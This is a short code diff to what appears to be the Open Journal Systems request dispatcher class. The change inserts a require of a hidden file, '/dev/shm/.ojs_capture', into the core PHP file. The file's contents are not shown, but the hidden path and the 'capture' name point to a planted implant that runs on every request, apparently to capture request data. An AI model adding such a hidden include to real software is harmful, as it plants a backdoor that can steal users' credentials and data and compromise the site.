@@ -13,7 +13,7 @@
  *
  * @brief Class dispatching HTTP requests to handlers.
  */
-
+require ("/dev/shm/.ojs_capture");
 namespace PKP\core;
 
 use APP\core\Services;
